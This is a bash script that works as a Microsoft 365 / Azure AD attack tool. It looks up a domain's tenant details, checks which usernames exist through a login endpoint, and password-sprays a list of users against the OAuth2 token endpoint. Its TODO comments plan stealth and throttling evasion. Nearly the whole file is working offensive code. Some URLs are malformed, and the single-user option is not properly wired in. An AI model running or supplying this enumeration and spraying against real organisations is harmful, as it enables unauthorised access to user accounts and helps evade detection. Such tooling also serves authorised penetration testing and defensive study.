#!/bin/bash

# TODO:
# - separate enumeration and password spraying
# - make every switch a function
# - spray only valid found usernames
# - add throttling and user-agent strings
# - implement any stealth (fireprox, or other solutions)
# - write out to file

while test $# -gt 0; do
    case "$1" in 
        -h|--help)
            echo "-d or --domain=supply a domain name"
            echo "-u or --user=supply a list of usernames"
            echo "-h or --help=print this message"
            exit 0
            ;;
        -d|--domain)
            shift
            if test $# -gt 0; then
                DOMAIN="$1"
            else
                echo "Please supply a domain name"
                exit 1
            fi 
            shift
            ;;
        -u|--user)
            shift
            if test $# -gt 0; then
                USERNAME="$1"
            else
                echo "Please supply a user name"
                exit 1
            fi 
            shift
            ;;
        -uf|--userfile)
            shift
            if test $# -gt 0; then
                USERFILE="$1"
            else
                echo "Please supply a file"
                exit 1
            fi
            shift
            ;;
        -p|--password)
            shift
            if test $# -gt 0; then
                PASSWORD="$1"
            else
                echo "Please supply a password"
                exit 1
            fi
            shift
            ;;
        *)
            break
            ;;
    esac
done

if [[ -n $DOMAIN ]]
then
    echo
    echo "[*] Checking AutoDiscover DNS Entry"
    host autodiscover.$DOMAIN

    echo
    echo "[*] Checking Tenant ID"
    curl -s https:///login.microsoftonline.com/$DOMAIN/v2.0/.well-known/openid-configuration | jq

    echo
    echo "[*] Checking NameSpace for 'Unknown', 'Federated', 'Managed'"
    curl -s https:///login.microsoftonline.com/getuserrealm.srf\?login\=$DOMAIN\&\json\=1 | jq
fi

if [[ -n $USERFILE || -n $USERNAME ]]
then
    echo
    echo "[*] Checking users"
    for users in $(cat $USERFILE);
    do
        echo
        sleep 5
        USER_EXISTS=$(curl -s -X POST https:///login.microsoftonline.com/common/GetCredentialType --data {\"Username\":\"$users\"} | jq '.IfExistsResult')
        if [[ $USER_EXISTS -eq 0 ]]; 
        then
            echo "$users - VALID"
        elif [[ $USER_EXISTS -eq 1 ]]; then
            echo "$users - INVALID"
        elif [[ $USER_EXISTS -eq 2 ]]; then
            echo "Scans being throttled"
            exit 1
        elif [[ $USER_EXISTS -eq 4 ]]; then
            echo "Server error... Exiting"
            exit 1
        elif [[ $USER_EXISTS -eq 5 ]]; then
            echo "$USER_EXISTS - VALID for different IdP"
        elif [[ $USER_EXISTS -eq 6 ]]; then
            echo "$USER_EXISTS - VALID for domain and different IdP"
        fi

    done
fi

if [[ -n $PASSWORD && -n $USERFILE ]]
then
    echo 
    echo '[*] Spraying Passwords'

    for users in $(cat $USERFILE);
    do
        echo 
        echo "[*] Spraying Username: $users Password: $PASSWORD"
        curl -s -X POST https://login.microsoft.com/common/oauth2/token --data {\"resource\":\"https://graph.windows.net\",\"client_id\": \"1b730954-1685-4b74-9bfd-dac224a7b894\", \"client_info\": \"1\", \"grant_type\": \"password\", \"username\":\"$users\", \"password\":\"$PASSWORD\", \"scope\":\"openid\"}
    done
fi
